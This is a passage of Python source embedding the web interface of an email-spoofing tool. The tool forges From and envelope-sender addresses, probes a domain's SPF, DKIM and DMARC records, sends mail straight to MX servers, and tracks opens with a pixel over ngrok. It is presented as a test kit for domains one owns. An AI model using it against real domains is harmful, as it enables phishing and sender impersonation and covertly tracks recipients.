  .pf-badge.pass { background: #14532d; color: #4ade80; }
  .pf-badge.fail { background: #7f1d1d; color: #fca5a5; }
  .pf-badge.warn { background: #78350f; color: #fbbf24; }
  .pf-badge.info { background: #1e3a5f; color: #60a5fa; }
  .pf-badge.none { background: #334155; color: #94a3b8; }

  .probe-steps {
    display: grid; grid-template-columns: repeat(5, 1fr); gap: .25rem; margin-bottom: .4rem;
  }
  .probe-step {
    background: #0f172a; border-radius: 4px; padding: .25rem .2rem;
    text-align: center; font-size: .55rem; border: 1px solid #1e293b;
  }
  .probe-step .label { color: #64748b; display: block; margin-bottom: .1rem; }
  .probe-step.ok .status { color: #4ade80; }
  .probe-step.fail .status { color: #f87171; }
  .probe-step.warn .status { color: #fbbf24; }
  .probe-step.pending .status { color: #475569; }

  /* Log output */
  .log-output {
    background: #0f172a; border: 1px solid #1e293b; border-radius: 6px;
    padding: .5rem; font-family: 'SF Mono', Menlo, monospace;
    font-size: .6rem; line-height: 1.45; color: #94a3b8;
    flex: 1; min-height: 150px; max-height: 400px; overflow-y: auto;
    white-space: pre-wrap; word-break: break-all;
  }
  .log-output .success { color: #4ade80; font-weight: bold; }
  .log-output .error { color: #f87171; }
  .log-output .warn { color: #fbbf24; }
  .log-output .info { color: #60a5fa; }
  .log-output .header { color: #c084fc; font-weight: bold; }

  /* Open tracker */
  .open-tracker h4 { color: #94a3b8; font-size: .62rem; text-transform: uppercase; margin-bottom: .3rem; }
  .open-event {
    display: flex; align-items: center; gap: .4rem; padding: .2rem 0;
    border-bottom: 1px solid #1e293b; font-family: 'SF Mono', Menlo, monospace; font-size: .65rem;
  }
  .open-event .dot { width: 6px; height: 6px; border-radius: 50%; background: #4ade80; animation: pulse 1.5s infinite; }
  .open-event .time { color: #4ade80; }
  .open-event .detail { color: #94a3b8; }
  .open-event.waiting .dot { background: #475569; animation: none; }
  .open-event.waiting .time { color: #475569; }
  .open-event.waiting .detail { color: #475569; }

  .pf-placeholder {
    display: flex; align-items: center; justify-content: center;
    min-height: 120px; color: #334155; font-size: .8rem;
  }

  @media (max-width: 800px) {
    .layout { grid-template-columns: 1fr; }
    .pf-grid { grid-template-columns: 1fr; }
    .probe-steps { grid-template-columns: repeat(3, 1fr); }
    .pipe-dot { width: 24px; height: 24px; }
    .pipe-dot svg { width: 12px; height: 12px; }
  }
</style>
</head>
<body>
<h1>Spoof</h1>
<p class="subtitle">Preflight check + live send — test your domain's DMARC / SPF</p>
<div class="warning-banner">For security testing of domains you own only ;)</div>
<div class="view-tabs">
  <button class="view-tab active" onclick="switchView('send')">Send</button>
  <button class="view-tab" onclick="switchView('dashboard')">Dashboard</button>
</div>

<!-- Password modal for send action -->
<div class="pw-overlay hidden" id="pw-overlay">
  <div class="pw-box">
    <h3>Enter Password</h3>
    <input type="password" id="pw-input" placeholder="Password" autocomplete="off">
    <div class="pw-err" id="pw-err"></div>
    <button onclick="checkPassword()">Unlock</button>
  </div>
</div>

<div class="view-panel active" id="view-send">
<div class="layout">
  <!-- LEFT: Form -->
  <div class="panel">
    <h2>Compose</h2>
    <div class="field">
      <label>From (spoofed)</label>
      <input type="text" id="from_addr" value="" placeholder="sender@example.com">
      <div class="hint">What the recipient sees</div>
    </div>
    <div class="field">
      <label>Envelope / Return-Path</label>
      <input type="text" id="envelope_from" value="" placeholder="bounce@example.com">
      <div class="hint">Used for SPF &amp; bounces (hidden from user)</div>
    </div>
    <div class="field">
      <label>To</label>
      <input type="email" id="to_addr" value="" placeholder="user@recipient.com" required>
    </div>
    <div class="field">
      <label>Subject</label>
      <input type="text" id="subject" value="" placeholder="Subject line">
    </div>
    <div class="field">
      <label>Body (text)</label>
      <textarea id="body_text" rows="2" placeholder="Plain text body"></textarea>
    </div>
    <div class="toggle-row">
      <input type="checkbox" id="use_html" checked>
      <label for="use_html">Include HTML body</label>
    </div>
    <div class="field" id="html-field">
      <label>Body (HTML)</label>
      <textarea id="body_html" rows="2"><div style="font-family:Arial;max-width:600px;margin:0 auto;padding:20px"><h2 style="color:#333">Hello</h2><p style="color:#555">This is the HTML body. Edit to see the preview update live.</p></div></textarea>
    </div>
    <div class="field">
      <label>Attachments</label>
      <div class="attachments-area" onclick="document.getElementById('file-input').click()">
        <input type="file" id="file-input" multiple onchange="handleFiles(this.files)">
        Click or drag to attach
      </div>
      <div class="file-list" id="file-list"></div>
    </div>
    <div class="btn-row">
      <button class="btn btn-probe" id="probe-btn" onclick="runPreflight()">Preflight</button>
      <button class="btn btn-send" id="send-btn" onclick="requirePassword(sendEmail)">Send</button>
    </div>
  </div>

  <!-- RIGHT: Pipeline + Details -->
  <div class="right-panel">
    <!-- Pipeline stepper -->
    <div class="pipeline">
      <div class="pipe-track" id="pipe-track">
        <div class="pipe-stage idle" id="stage-preview">
          <div class="pipe-dot">
            <span class="dot-num">0</span>
            <svg class="check-icon" viewBox="0 0 24 24" fill="none" stroke="#4ade80" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
            <svg class="spin-icon" viewBox="0 0 24 24" fill="none" stroke="#60a5fa" stroke-width="2.5" stroke-linecap="round" style="animation:stepSpin .8s linear infinite"><path d="M12 2a10 10 0 0 1 10 10" /></svg>
            <svg class="x-icon" viewBox="0 0 24 24" fill="none" stroke="#f87171" stroke-width="3" stroke-linecap="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
          </div>
          <div class="pipe-label">Preview</div>
          <div class="pipe-detail" id="stage-preview-detail"></div>
        </div>
        <div class="pipe-stage idle" id="stage-preflight">
          <div class="pipe-dot">
            <span class="dot-num">1</span>
            <svg class="check-icon" viewBox="0 0 24 24" fill="none" stroke="#4ade80" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
            <svg class="spin-icon" viewBox="0 0 24 24" fill="none" stroke="#60a5fa" stroke-width="2.5" stroke-linecap="round" style="animation:stepSpin .8s linear infinite"><path d="M12 2a10 10 0 0 1 10 10" /></svg>
            <svg class="x-icon" viewBox="0 0 24 24" fill="none" stroke="#f87171" stroke-width="3" stroke-linecap="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
          </div>
          <div class="pipe-label">Preflight</div>
          <div class="pipe-detail" id="stage-preflight-detail"></div>
        </div>
        <div class="pipe-stage idle" id="stage-inflight">
          <div class="pipe-dot">
            <span class="dot-num">2</span>
            <svg class="check-icon" viewBox="0 0 24 24" fill="none" stroke="#4ade80" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
            <svg class="spin-icon" viewBox="0 0 24 24" fill="none" stroke="#60a5fa" stroke-width="2.5" stroke-linecap="round" style="animation:stepSpin .8s linear infinite"><path d="M12 2a10 10 0 0 1 10 10" /></svg>
            <svg class="x-icon" viewBox="0 0 24 24" fill="none" stroke="#f87171" stroke-width="3" stroke-linecap="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
          </div>
          <div class="pipe-label">In Flight</div>
          <div class="pipe-detail" id="stage-inflight-detail"></div>
        </div>
        <div class="pipe-stage idle" id="stage-delivered">
          <div class="pipe-dot">
            <span class="dot-num">3</span>
            <svg class="check-icon" viewBox="0 0 24 24" fill="none" stroke="#4ade80" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
            <svg class="spin-icon" viewBox="0 0 24 24" fill="none" stroke="#60a5fa" stroke-width="2.5" stroke-linecap="round" style="animation:stepSpin .8s linear infinite"><path d="M12 2a10 10 0 0 1 10 10" /></svg>
            <svg class="x-icon" viewBox="0 0 24 24" fill="none" stroke="#f87171" stroke-width="3" stroke-linecap="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
          </div>
          <div class="pipe-label">Delivered</div>
          <div class="pipe-detail" id="stage-delivered-detail"></div>
        </div>
        <div class="pipe-stage idle" id="stage-opened">
          <div class="pipe-dot">
            <span class="dot-num">4</span>
            <svg class="check-icon" viewBox="0 0 24 24" fill="none" stroke="#4ade80" stroke-width="3" stroke-linecap="round" stroke-linejoin="round"><polyline points="20 6 9 17 4 12"/></svg>
            <svg class="spin-icon" viewBox="0 0 24 24" fill="none" stroke="#60a5fa" stroke-width="2.5" stroke-linecap="round" style="animation:stepSpin .8s linear infinite"><path d="M12 2a10 10 0 0 1 10 10" /></svg>
            <svg class="x-icon" viewBox="0 0 24 24" fill="none" stroke="#f87171" stroke-width="3" stroke-linecap="round"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg>
          </div>
          <div class="pipe-label">Opened</div>
          <div class="pipe-detail" id="stage-opened-detail"></div>
        </div>
      </div>
    </div>

    <!-- Detail tabs -->
    <div class="detail-panel">
      <div class="tab-bar">
        <button class="tab-btn active" onclick="showTab('preview',this)">Preview</button>
        <button class="tab-btn" onclick="showTab('dns',this)">DNS Records</button>
        <button class="tab-btn" onclick="showTab('sendlog',this)">Send Log</button>
        <button class="tab-btn" onclick="showTab('tracker',this)">Open Tracker</button>
      </div>

      <div class="tab-content active" id="tab-preview">
        <div id="preview-container" style="flex:1;display:flex;flex-direction:column">
          <iframe id="preview-iframe-main" style="flex:1;min-height:200px;border:none;border-radius:6px;background:white" srcdoc="<div style='display:flex;align-items:center;justify-content:center;height:100%;color:#999;font-family:sans-serif'>Compose an HTML body to see a live preview</div>"></iframe>
        </div>
      </div>

      <div class="tab-content" id="tab-dns">
        <div id="dns-results">
          <div class="pf-placeholder">Run Preflight to see DNS records</div>
        </div>
      </div>

      <div class="tab-content" id="tab-sendlog">
        <div class="log-output" id="log-output">Send an email to see the SMTP log here.</div>
      </div>

      <div class="tab-content" id="tab-tracker">
        <div class="open-tracker">
          <h4>Email Open Tracking</h4>
          <div id="tracker-content">
            <div class="pf-placeholder" style="min-height:80px">No tracked emails yet</div>
          </div>
        </div>
      </div>
    </div>
  </div>
</div>
</div><!-- /view-send -->

<div class="view-panel" id="view-dashboard">
  <div class="dash-stats">
    <div class="stat-card stat-sends">
      <div class="num" id="stat-sends">0</div>
      <div class="label">Emails Sent</div>
    </div>
    <div class="stat-card stat-opens">
      <div class="num" id="stat-opens">0</div>
      <div class="label">Confirmed Opens</div>
    </div>
    <div class="stat-card stat-rate">
      <div class="num" id="stat-rate">&mdash;</div>
      <div class="label">Open Rate</div>
    </div>
  </div>
  <div class="dash-feed">
    <h2><span class="pulse-dot"></span> Live Event Feed</h2>
    <div id="feed-list">
      <div class="feed-empty">Waiting for activity...</div>
    </div>
  </div>
</div><!-- /view-dashboard -->

<div class="ngrok-bar" id="ngrok-bar">
  <span class="ngrok-dot" id="ngrok-dot"></span>
  <span id="ngrok-text">Checking ngrok...</span>
</div>

<script>
// ── View switching ──
function switchView(name) {
  document.querySelectorAll('.view-tab').forEach(b => b.classList.remove('active'));
  document.querySelectorAll('.view-panel').forEach(p => p.classList.remove('active'));
  document.getElementById('view-' + name).classList.add('active');
  document.querySelector('.view-tab[onclick*="' + name + '"]').classList.add('active');
  if (name === 'dashboard' && !_dashStarted) startDashPolling();
}

// ── Password gate ──
let _sendUnlocked = false;
function requirePassword(cb) {
  if (_sendUnlocked) { cb(); return; }
  _pendingSendCb = cb;
  document.getElementById('pw-overlay').classList.remove('hidden');
  const inp = document.getElementById('pw-input');
  inp.value = '';
  document.getElementById('pw-err').textContent = '';
  setTimeout(() => inp.focus(), 100);
}
let _pendingSendCb = null;
function checkPassword() {
  const inp = document.getElementById('pw-input');
  if (inp.value === 'password') {
    _sendUnlocked = true;
    document.getElementById('pw-overlay').classList.add('hidden');
    if (_pendingSendCb) { _pendingSendCb(); _pendingSendCb = null; }
  } else {
    document.getElementById('pw-err').textContent = 'sry not for you :)';
    inp.value = '';
    inp.focus();
  }
}
document.addEventListener('keydown', e => {
  if (!document.getElementById('pw-overlay').classList.contains('hidden') && e.key === 'Enter') checkPassword();
  if (!document.getElementById('pw-overlay').classList.contains('hidden') && e.key === 'Escape') document.getElementById('pw-overlay').classList.add('hidden');
});

// ── Dashboard polling ──
let _dashStarted = false;
let _dashCursor = 0, _dashSends = 0, _dashOpens = 0;

function dashFmtTime(iso) {
  const d = new Date(iso);
  const diff = (Date.now() - d) / 1000;
  if (diff < 60) return Math.floor(diff) + 's ago';
  if (diff < 3600) return Math.floor(diff/60) + 'm ago';
  if (diff < 86400) return Math.floor(diff/3600) + 'h ago';
  return d.toLocaleDateString();
}

function renderDashEvent(ev) {
  const isSend = ev.type === 'send';
  const div = document.createElement('div');
  div.className = 'dash-event ' + (isSend ? 'ev-send' : 'ev-open');
  const icon = isSend ? '&#9993;' : '&#128065;';
  const title = isSend ? 'Sent to ' + ev.to : 'Opened by ' + ev.to;
  const detail = isSend
    ? ev.from + ' — "' + ev.subject + '"'
    : 'from ' + (ev.ip || '?') + ' — "' + ev.subject + '"';
  div.innerHTML =
    '<div class="ev-icon">' + icon + '</div>' +
    '<div class="ev-body"><div class="ev-title">' + title + '</div><div class="ev-detail">' + detail + '</div></div>' +
    '<div class="ev-time">' + dashFmtTime(ev.time) + '</div>';
  return div;
}

function startDashPolling() {
  _dashStarted = true;
  async function poll() {
    try {
      const r = await fetch('/dashboard/events?since=' + _dashCursor);
      const d = await r.json();
      if (d.events.length > 0) {
        const list = document.getElementById('feed-list');
        if (_dashCursor === 0 && d.events.length > 0) list.innerHTML = '';
        d.events.forEach(ev => {
          if (ev.type === 'send') _dashSends++;
          if (ev.type === 'open') _dashOpens++;
          list.insertBefore(renderDashEvent(ev), list.firstChild);
        });
        _dashCursor = d.total;
        document.getElementById('stat-sends').textContent = _dashSends;
        document.getElementById('stat-opens').textContent = _dashOpens;
        document.getElementById('stat-rate').textContent =
          _dashSends > 0 ? Math.round((_dashOpens/_dashSends)*100) + '%' : '\u2014';
      }
    } catch(e) {}
  }
  poll();
  setInterval(poll, 3000);
}

// ── Auto-switch view from URL hash ──
if (window.location.hash === '#dashboard') switchView('dashboard');

// ── Pipeline state management ──
const STAGE_IDS = ['preview','preflight','inflight','delivered','opened'];
const STAGE_TAB_MAP = { preview: 'preview', preflight: 'dns', inflight: 'sendlog', delivered: 'sendlog', opened: 'tracker' };

// Build segment lines between dots on first load
let _segsBuilt = false;
function buildSegments() {
  if (_segsBuilt) return;
  _segsBuilt = true;
  const track = document.getElementById('pipe-track');
  const stages = track.querySelectorAll('.pipe-stage');
  for (let i = 0; i < stages.length - 1; i++) {
    const seg = document.createElement('div');
    seg.className = 'pipe-seg';
    seg.id = 'seg-' + i;
    track.appendChild(seg);
  }
  positionSegments();
  window.addEventListener('resize', positionSegments);
}
function positionSegments() {
  const track = document.getElementById('pipe-track');
  const dots = track.querySelectorAll('.pipe-dot');
  for (let i = 0; i < dots.length - 1; i++) {
    const seg = document.getElementById('seg-' + i);
    if (!seg) continue;
    const r1 = dots[i].getBoundingClientRect();
    const r2 = dots[i+1].getBoundingClientRect();
    const tr = track.getBoundingClientRect();
    const left = r1.left + r1.width/2 - tr.left;
    const right = r2.left + r2.width/2 - tr.left;
    seg.style.left = left + 'px';
    seg.style.width = (right - left) + 'px';
  }
}

function setPipeStage(id, state, detail) {
  buildSegments();
  const el = document.getElementById('stage-' + id);
  const det = document.getElementById('stage-' + id + '-detail');
  if (el) el.className = 'pipe-stage ' + state;
  if (det && detail !== undefined) det.textContent = detail;
  if (state === 'active' || state === 'glow' || state === 'fail') {
    const tab = STAGE_TAB_MAP[id];
    if (tab) {
      const btns = document.querySelectorAll('.tab-btn');
      const tabNames = ['preview','dns','sendlog','tracker'];
      const idx = tabNames.indexOf(tab);
      if (idx >= 0 && btns[idx]) showTab(tab, btns[idx]);
    }
  }
}
function setPipeConn(id, state) {
  const el = document.getElementById('seg-' + id);
  if (el) el.className = 'pipe-seg ' + state;
}
function resetPipeline() {
  buildSegments();
  STAGE_IDS.forEach(s => setPipeStage(s, 'idle', ''));
  for (let i = 0; i < STAGE_IDS.length - 1; i++) setPipeConn(i, '');
}

// ── Ngrok status check ──
async function checkNgrok() {
  const bar = document.getElementById('ngrok-bar');
  const txt = document.getElementById('ngrok-text');
  try {
    const resp = await fetch('/status');
    const data = await resp.json();
    if (data.ngrok) {
      bar.className = 'ngrok-bar connected';
      txt.innerHTML = `Tracking via <a href="${data.ngrok}" target="_blank">${data.ngrok}</a>`;
    } else {
      bar.className = 'ngrok-bar disconnected';
      txt.innerHTML = 'No ngrok tunnel — run <strong>ngrok http 8090</strong> for open tracking';
    }
  } catch(e) {
    bar.className = 'ngrok-bar disconnected';
    txt.textContent = 'Could not check ngrok status';
  }
}
checkNgrok();
setInterval(checkNgrok, 15000);

// ── Form helpers ──
let attachedFiles = [];
function handleFiles(files) { for (const f of files) attachedFiles.push(f); renderFileList(); }
function removeFile(i) { attachedFiles.splice(i,1); renderFileList(); }
function renderFileList() {
  const el = document.getElementById('file-list');
  el.innerHTML = attachedFiles.map((f,i) =>
    `<div class="file-item"><span>${f.name} (${(f.size/1024).toFixed(1)}K)</span><span class="remove" onclick="removeFile(${i})">x</span></div>`
  ).join('');
}
function updatePreview() {
  const iframe = document.getElementById('preview-iframe-main');
  const useHtml = document.getElementById('use_html').checked;
  const html = document.getElementById('body_html').value;
  const text = document.getElementById('body_text').value;
  if (useHtml && html.trim()) {
    iframe.srcdoc = html;
  } else if (text.trim()) {
    iframe.srcdoc = `<pre style="font-family:sans-serif;padding:16px;margin:0">${text.replace(/</g,'&lt;')}</pre>`;
  } else {
    iframe.srcdoc = '<div style="display:flex;align-items:center;justify-content:center;height:100%;color:#999;font-family:sans-serif">Compose an HTML body to see a live preview</div>';
  }
}
// Live preview updates
document.getElementById('body_html').addEventListener('input', updatePreview);
document.getElementById('body_text').addEventListener('input', updatePreview);
document.getElementById('use_html').addEventListener('change', function() {
  document.getElementById('html-field').style.display = this.checked ? 'block' : 'none';
  updatePreview();
});
// Initial preview
updatePreview();

// Light up Stage 0 when composing
['from_addr','to_addr','subject','body_text','body_html'].forEach(id => {
  const el = document.getElementById(id);
  if (el) el.addEventListener('focus', () => {
    const stage = document.getElementById('stage-preview');
    if (stage && stage.classList.contains('idle')) {
      setPipeStage('preview', 'active', 'Composing...');
    }
  });
});

function showTab(name, btnEl) {
  document.querySelectorAll('.tab-btn').forEach(b => b.classList.remove('active'));
  document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
  document.getElementById('tab-' + name).classList.add('active');
  if (btnEl) btnEl.classList.add('active');
}

function colorLog(text) {
  return text
    .replace(/^(═══.*═══)$/gm, '<span class="header">$1</span>')
    .replace(/(✅.*)/g, '<span class="success">$1</span>')
    .replace(/(✓.*)/g, '<span class="success">$1</span>')
    .replace(/(✗.*)/g, '<span class="error">$1</span>')
    .replace(/(⚠.*)/g, '<span class="warn">$1</span>')
    .replace(/(SOFTFAIL|FAIL|NONE|p=none|p=reject|p=quarantine)/g, '<span class="warn">$1</span>')
    .replace(/(DELIVERED|PASS)/g, '<span class="success">$1</span>');
}

function badge(type, text) {
  return `<span class="pf-badge ${type}">${text}</span>`;
}

function probeStepHtml(label, status, statusText) {
  const cls = status === 'ok' ? 'ok' : status === 'fail' ? 'fail' : status === 'warn' ? 'warn' : 'pending';
  return `<div class="probe-step ${cls}"><span class="label">${label}</span><span class="status">${statusText}</span></div>`;
}

// ── Preflight ──
let _lastPreflight = null;
async function runPreflight() {
  const btn = document.getElementById('probe-btn');
  btn.className = 'btn btn-probe sending'; btn.textContent = 'Checking...';

  // Pipeline: mark preview done, activate preflight
  resetPipeline();
  setPipeStage('preview', 'done', 'Ready');
  setPipeConn('0', 'done');
  setPipeStage('preflight', 'active', 'Scanning DNS...');

  // Switch to DNS tab
  showTab('dns', document.querySelectorAll('.tab-btn')[0]);

  const container = document.getElementById('dns-results');
  container.innerHTML = '<div class="pf-placeholder" style="color:#3b82f6">Querying DNS records...</div>';

  const params = new URLSearchParams({
    from_addr: document.getElementById('from_addr').value,
    to_addr: document.getElementById('to_addr').value,
    envelope_from: document.getElementById('envelope_from').value,
  });

  try {
    const resp = await fetch('/preflight?' + params.toString());
    const d = await resp.json();
    _lastPreflight = d;

    const pred = d.probe.prediction;
    const isBlocked = (pred === 'BLOCKED' || pred === 'MAIL_FROM_REJECTED');

    // Update pipeline — always green on completion, fail only on hard errors
    if (pred === 'PORT_BLOCKED') {
      setPipeStage('preflight', 'fail', 'Port blocked');
    } else if (pred === 'ERROR' || pred === 'CANNOT_RESOLVE') {
      setPipeStage('preflight', 'fail', pred);
    } else {
      setPipeStage('preflight', 'done', 'Complete');
      setPipeConn('1', 'done');
    }

    // SPF badge
    let spfBadge = badge('none', 'NONE');
    if (d.spf.verdict === 'SOFTFAIL') spfBadge = badge('warn', 'SOFTFAIL');
    else if (d.spf.verdict === 'FAIL') spfBadge = badge('fail', 'HARDFAIL');
    else if (d.spf.verdict === 'PASS') spfBadge = badge('pass', 'PASS');
    else if (d.spf.verdict === 'NEUTRAL') spfBadge = badge('info', 'NEUTRAL');
    let dkimBadge = d.dkim.found ? badge('fail', 'WILL FAIL') : badge('none', 'NO KEY');
    let dmarcBadge = badge('none', 'NONE');
    if (d.dmarc.policy === 'none') dmarcBadge = badge('fail', 'p=none');
    else if (d.dmarc.policy === 'quarantine') dmarcBadge = badge('warn', 'p=quarantine');
    else if (d.dmarc.policy === 'reject') dmarcBadge = badge('pass', 'p=reject');
    else if (d.dmarc.policy === 'missing') dmarcBadge = badge('none', 'MISSING');
    let mxBadge = d.mx.selected ? badge('info', d.mx.selected.split('.').slice(-3).join('.')) : badge('fail', 'NONE');

    // Probe steps
    let probeHtml = '';
    const pr = d.probe;
    probeHtml += probeStepHtml('Port 25', pr.port25==='OPEN'?'ok':pr.port25==='BLOCKED'?'fail':'pending', pr.port25||'—');
    probeHtml += probeStepHtml('EHLO', pr.ehlo==='OK'?'ok':'pending', pr.ehlo||'—');
    probeHtml += probeStepHtml('STARTTLS', pr.starttls==='OK'?'ok':pr.starttls==='NOT_SUPPORTED'?'warn':'pending', pr.starttls||'—');
    probeHtml += probeStepHtml('MAIL FROM', pr.mail_from==='ACCEPTED'?'ok':pr.mail_from?.startsWith('REJECTED')?'fail':'pending', pr.mail_from?.replace('REJECTED_','')|| '—');
    probeHtml += probeStepHtml('RCPT TO', pr.rcpt_to==='ACCEPTED'?'ok':pr.rcpt_to?.startsWith('REJECTED')?'fail':'pending', pr.rcpt_to?.replace('REJECTED_','')||'—');

    container.innerHTML = `
      <div class="probe-steps">${probeHtml}</div>
      <div class="pf-grid">
        <div class="pf-card">
          <h3 style="color:#60a5fa">MX (${d.to_domain}) ${mxBadge}</h3>
          <p>${d.mx.records.map(r => `pri ${r.priority}: <code>${r.host}</code>`).join('<br>') || 'No records found'}</p>
        </div>
        <div class="pf-card">
          <h3 style="color:#f472b6">SPF (${d.from_domain}) ${spfBadge}</h3>
          <p>${d.spf.record ? `<code>${d.spf.record}</code>` : 'No SPF record found'}</p>
          ${d.spf.policy ? `<p style="margin-top:.15rem">Policy: <strong>${d.spf.policy}</strong></p>` : ''}
        </div>
        <div class="pf-card">
          <h3 style="color:#a78bfa">DKIM (${d.from_domain}) ${dkimBadge}</h3>
          <p>${d.dkim.found ? `Key at <code>${d.dkim.record}</code><br>No private key = FAIL` : 'No DKIM key found'}</p>
        </div>
        <div class="pf-card">
          <h3 style="color:#22d3ee">DMARC (${d.from_domain}) ${dmarcBadge}</h3>
          <p>${d.dmarc.record ? `<code>${d.dmarc.record}</code>` : 'No DMARC record found'}</p>
          ${d.dmarc.policy === 'none' ? '<p style="margin-top:.15rem;color:#fca5a5"><strong>p=none = no protection</strong></p>' : ''}
        </div>
      </div>
      <details style="margin-top:.3rem">
        <summary style="font-size:.62rem;color:#64748b;cursor:pointer">Raw preflight log</summary>
        <div class="log-output" style="margin-top:.2rem;max-height:200px;min-height:0">${colorLog(d.log.join('\n'))}</div>
      </details>
    `;
  } catch(err) {
    setPipeStage('preflight', 'fail', 'Error');
    container.innerHTML = `<div class="pf-placeholder" style="color:#f87171">Error: ${err.message}</div>`;
  }
  btn.className = 'btn btn-probe'; btn.textContent = 'Preflight';
}

// ── Send ──
async function sendEmail() {
  const btn = document.getElementById('send-btn');
  const logEl = document.getElementById('log-output');

  btn.className = 'btn btn-send sending'; btn.textContent = 'Sending...';

  // Pipeline: keep earlier stages done, activate in-flight
  setPipeStage('preview', 'done', 'Ready');
  setPipeConn('0', 'done');
  if (!document.getElementById('stage-preflight').classList.contains('warn') &&
      !document.getElementById('stage-preflight').classList.contains('done')) {
    setPipeStage('preflight', 'done', 'Skipped');
  }
  setPipeConn('1', 'active');
  setPipeStage('inflight', 'active', 'Connecting...');

  // Switch to send log tab
  showTab('sendlog', document.querySelectorAll('.tab-btn')[1]);
  logEl.innerHTML = 'Connecting to MX server...\n';

  const fd = new FormData();
  fd.append('from_addr', document.getElementById('from_addr').value);
  fd.append('envelope_from', document.getElementById('envelope_from').value);
  fd.append('to_addr', document.getElementById('to_addr').value);
  fd.append('subject', document.getElementById('subject').value);
  fd.append('body_text', document.getElementById('body_text').value);
  fd.append('body_html', document.getElementById('use_html').checked ? document.getElementById('body_html').value : '');
  for (const f of attachedFiles) fd.append('attachments', f);

  try {
    const resp = await fetch('/send', { method: 'POST', body: fd });
    const data = await resp.json();
    logEl.innerHTML = colorLog(data.log);
    logEl.scrollTop = logEl.scrollHeight;

    if (data.success) {
      btn.className = 'btn btn-send success'; btn.textContent = 'Delivered';
      // Pipeline: delivered
      setPipeStage('inflight', 'done', 'Sent');
      setPipeConn('1', 'done');
      setPipeConn('2', 'done');
      setPipeStage('delivered', 'glow', new Date().toLocaleTimeString());
      setPipeConn('3', 'active');
      setPipeStage('opened', 'active', 'Waiting...');
      // Start tracking opens
      if (data.track_id) startTrackingPolling(data.track_id);
    } else {
      // Pipeline: failed
      setPipeStage('inflight', 'fail', 'Rejected');
      setPipeConn('1', 'fail');
    }
  } catch(err) {
    logEl.innerHTML = `<span class="error">Error: ${err.message}</span>`;
    setPipeStage('inflight', 'fail', 'Error');
    setPipeConn('1', 'fail');
  }
  setTimeout(() => { btn.className = 'btn btn-send'; btn.textContent = 'Send'; }, 4000);
}

// ── Open Tracking ──
let _trackPollers = {};

function startTrackingPolling(trackId) {
  const el = document.getElementById('tracker-content');

  if (!document.getElementById('track-' + trackId)) {
    const entry = document.createElement('div');
    entry.id = 'track-' + trackId;
    entry.className = 'open-event waiting';
    entry.innerHTML = `
      <span class="dot"></span>
      <span class="time">waiting...</span>
      <span class="detail">${document.getElementById('to_addr').value} — ${document.getElementById('subject').value}</span>
    `;
    const placeholder = el.querySelector('.pf-placeholder');
    if (placeholder) placeholder.remove();
    el.prepend(entry);
  }

  if (_trackPollers[trackId]) clearInterval(_trackPollers[trackId]);
  _trackPollers[trackId] = setInterval(async () => {
    try {
      const resp = await fetch('/track-events?id=' + trackId);
      const data = await resp.json();
      const entry = document.getElementById('track-' + trackId);
      if (data.opens && data.opens.length > 0) {
        const latest = data.opens[data.opens.length - 1];
        const t = new Date(latest.time);
        const timeStr = t.toLocaleTimeString();
        entry.className = 'open-event';
        entry.innerHTML = `
          <span class="dot"></span>
          <span class="time">${timeStr}</span>
          <span class="detail">Opened ${data.opens.length}x — ${data.to} — ${data.subject}</span>
        `;
        // Update pipeline stage 4
        setPipeConn('3', 'done');
        setPipeStage('opened', 'glow', `${data.opens.length}x — ${timeStr}`);
        // Flash the tracker tab
        const trackerBtn = document.querySelectorAll('.tab-btn')[2];
        if (trackerBtn && !trackerBtn.classList.contains('active')) {
          trackerBtn.style.color = '#4ade80';
          trackerBtn.style.textShadow = '0 0 8px #4ade80';
          setTimeout(() => { trackerBtn.style.color = ''; trackerBtn.style.textShadow = ''; }, 3000);
        }
      }
    } catch(e) {}
  }, 5000);
}
</script>
</body>
</html>
"""


# ── Multipart form parser (replaces deprecated cgi module) ──────────
def _parse_multipart(content_type, body):
    """Parse multipart/form-data. Returns (fields_dict, attachments_list)."""
    # Extract boundary from Content-Type header
    boundary = None
    for part in content_type.split(";"):
        part = part.strip()
        if part.startswith("boundary="):
            boundary = part[len("boundary="):]
            break
    if not boundary:
        return {}, []

    fields = {}
    attachments = []
    # Split by boundary
    boundary_bytes = ("--" + boundary).encode()
    parts = body.split(boundary_bytes)

    for part in parts[1:]:  # skip preamble
        if part.startswith(b"--"):  # closing boundary
            break
        # Split headers from body at \r\n\r\n
        if b"\r\n\r\n" not in part:
            continue
        header_block, content = part.split(b"\r\n\r\n", 1)
        # Strip trailing \r\n
        if content.endswith(b"\r\n"):
            content = content[:-2]

        headers_str = header_block.decode("utf-8", errors="replace")
        # Parse Content-Disposition
        name = None
        filename = None
        for line in headers_str.split("\r\n"):
            if line.lower().startswith("content-disposition:"):
                for token in line.split(";"):
                    token = token.strip()
                    if token.startswith("name="):
                        name = token[5:].strip('"')
                    elif token.startswith("filename="):
                        filename = token[9:].strip('"')

        if not name:
            continue

        if filename:
            if filename and len(content) > 0:
                attachments.append((filename, content))
        else:
            fields[name] = content.decode("utf-8", errors="replace")

    return fields, attachments


# ── HTTP Handler ────────────────────────────────────────────────────
class SpoofHandler(BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass

    def do_GET(self):
        # ── Tracking pixel endpoint ──
        track_match = re.match(r'^/track/([a-f0-9]+)\.gif', self.path)
        if track_match:
            track_id = track_match.group(1)
            # Record the open event
            client_ip = self.client_address[0]
            user_agent = self.headers.get("User-Agent", "unknown")
            open_time = datetime.now(timezone.utc).isoformat()
            with _track_lock:
                if track_id in _track_store:
                    _track_store[track_id]["opens"].append({
